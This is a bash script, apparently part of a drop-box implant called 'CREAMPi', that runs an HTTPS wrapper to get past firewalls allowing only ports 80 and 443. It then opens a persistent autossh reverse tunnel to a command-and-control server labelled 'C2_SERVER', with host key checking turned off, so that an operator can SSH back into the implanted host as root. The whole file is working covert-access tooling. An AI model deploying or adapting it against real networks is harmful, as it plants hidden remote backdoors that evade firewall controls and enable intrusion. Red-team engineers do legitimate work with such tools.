#!/bin/bash
#
# Run starttls confuration (HTTPS/TLS Wrapper)
# 
# httpswrapper creates a proxy tunnel on the localhost wrapped in HTTPS
# i.e. most of the firewalls only allow 80 and 443 egress traffic
# now you can tunnel SSH traffic on httpswrapper to connect to port 443 on
# controlled remote server that listens SSH traffic.
# Connect to httpswrapper on specified port

HTTPSWRAPPER_DIR="/usr/local/etc/httpswrapper"
HTTPSWRAPPER_CONF="httpswrapper.conf"
HTTPSWRAPPER_PORT=4443

# SSH reverse tunnel configuration
#
# Below config will connect to the remote server.
# i.e. ssh user@153.231.21.50 -i /root/.ssh/id_rsa and will use the tunnel port to create
# a reverse ssh tunnel to connect back to this host. 

# The server which the CREAMPi will connect to
C2_SERVER="CLOUD_C2"

# Private key file to be used to authenticate to the remote server.
KEY_FILE=/user/.ssh/id_rsa

# Username that will be used to log in to the remote server
USER="user"

# Tunnel port to be used in connecting back to this host.
# Monitor port for autossh (use 0 to disable this feature)
# See: https://linux.die.net/man/1/autossh
MON_PORT=0
SSH_HTTPSWRAPPER_PORT=2222

# Logging
# the host will try to connect to the remote server time by time. logs are located in
# /var/log/httpswrapper.log to debug, verify the connection.
LOG_DIR=/var/log/httpswrapper.log

# Logging timestamp function
TIMESTAMP() {
  date "+%Y-%m-%d %H:%M:%S"
}

exec_httpswrapper() {
    /usr/local/bin/httpswrapper ${HTTPSWRAPPER_DIR}/${HTTPSWRAPPER_CONF}
    echo "[`TIMESTAMP`] Created a HTTPS tunnel on localhost:${HTTPSWRAPPER_PORT}.." >> ${LOG_DIR}
}

# Can be used to connect directly without the tunnel usage
# -o "ProxyCommand=openssl s_client -connect CLOUD_C2:443 -quiet"
exec_sshtunnel() {
  echo "[`TIMESTAMP`] Service started.." >> ${LOG_DIR} ; sleep 2 
  echo "[`TIMESTAMP`] Setting up reverse SSH tunnel to specified host (${C2_SERVER})" >> ${LOG_DIR}
  echo "[`TIMESTAMP`] Connecting to ${C2_SERVER} using ${USER} username and keyfile located in ${KEY_FILE}.." >> ${LOG_DIR}
  autossh -p ${HTTPSWRAPPER_PORT} \
          -M ${MON_PORT} \
          -R ${SSH_HTTPSWRAPPER_PORT}:127.0.0.1:22 \
          -i ${KEY_FILE} \
          -N \
          -f \
          -T \
          -q \
          -o "PubkeyAuthentication=yes" \
          -o "PasswordAuthentication=no" \
          -o "UserKnownHostsFile=/dev/null" \
          -o "StrictHostKeyChecking=no" \
          -o "ServerAliveInterval 30" \
          -o "ServerAliveCountMax 3" \
          -o "ExitOnForwardFailure=yes" \
          ${USER}@localhost
  sleep 2

  CHECK_STUN_CON=`netstat -plnt | grep ${HTTPSWRAPPER_PORT} | head -n1 | awk {'print $6'}`
  CHECK_CON=`netstat -plnt | grep ${HTTPSWRAPPER_PORT} | head -n1 | awk {'print $6'}`
  
  if [[ ${CHECK_STUN_CON} == "LISTEN" ]]; then
    echo "[`TIMESTAMP`] Successfully create a local SSH/HTTPS tunnel socket on port (${HTTPSWRAPPER_PORT}).." >> ${LOG_DIR}
  else
    echo "[`TIMESTAMP`] ERROR: SSH reverse tunnel failed. Unable to connect to the remote server (${C2_SERVER}).." >> ${LOG_DIR}
  fi

  if [[ ${CHECK_CON} == "LISTEN" ]]; then
    echo "[`TIMESTAMP`] Successfully established reverse ssh/https tunnel on the remote server (${C2_SERVER}).." >> ${LOG_DIR}
    echo "[`TIMESTAMP`] On the remote server, execute ssh -p ${SSH_HTTPSWRAPPER_PORT} root@localhost to connect back to ${HOSTNAME}.." >> ${LOG_DIR}
  else
    echo "[`TIMESTAMP`] ERROR: SSH/HTTPS reverse tunnel failed. Unable to connect to the remote server (${C2_SERVER}).." >> ${LOG_DIR}
  fi
}


main() {
    exec_httpswrapper
    exec_sshtunnel
}

main